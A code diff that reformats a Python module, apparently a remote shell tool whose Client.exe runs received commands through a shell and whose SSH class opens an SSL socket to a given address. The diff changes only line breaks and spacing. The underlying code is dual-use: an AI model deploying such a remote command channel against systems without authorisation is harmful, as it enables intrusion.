@@ -10,6 +10,7 @@ from queue import Queue
 from threading import Thread
 from socket import timeout as TimeOutError
 
+
 class Communicate(object):
 
     def __init__(self, session):
@@ -31,12 +32,15 @@ class Communicate(object):
                     if data != '-1':
                         self.recvs_decrypted.put(data)
 
-                else:self.stop()
-            except:pass
+                else:
+                    self.stop()
+            except:
+                pass
 
     def send(self, data):
         if len(data.strip()):
-            if not self.is_alive:return
+            if not self.is_alive:
+                return
             try:
                 self.session.sendall(data.encode('utf8'))
                 self.pending = True
@@ -50,6 +54,7 @@ class Communicate(object):
 
     def stop(self):
         self.is_alive = False
+
 
 class Client(object):
 
@@ -68,9 +73,11 @@ class Client(object):
                 self.communication.send('-1')
 
     def exe(self, cmd):
-        if cmd.strip() == 'cls':return '-1'
+        if cmd.strip() == 'cls':
+            return '-1'
         try:
-            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
+                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             output = proc[0].decode('utf8')
             errors = proc[1].decode('utf8')
             output = output if output else errors
@@ -92,6 +99,7 @@ class Client(object):
         self.is_alive = False
         self.communication.is_alive = False
 
+
 class SSH(object):
 
     def __init__(self, ip, port, home, max_time=10, verbose=False):
@@ -110,10 +118,12 @@ class SSH(object):
 
     def close(self):
         try:
-            if self.communication:self.communication.stop()
+            if self.communication:
+                self.communication.stop()
             self.recipient_session.shutdown(socket.SHUT_RDWR)
             self.recipient_session.close()
-        except:pass
+        except:
+            pass
 
     def send(self, cmd):
         if self.communication:
@@ -121,12 +131,14 @@ class SSH(object):
 
     def client(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.recipient_session = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)
+        self.recipient_session = ssl.wrap_socket(
+            sock, ssl_version=ssl.PROTOCOL_SSLv23)
         self.recipient_session.settimeout(self.max_time)
         try:
             self.recipient_session.connect((self.ip, self.port))
         except ConnectionRefusedError:
-            self.display('Failed to connect to {}:{}'.format(self.ip, self.port))
+            self.display('Failed to connect to {}:{}'.format(
+                self.ip, self.port))
             return -1
 
         communication = Communicate(self.recipient_session)
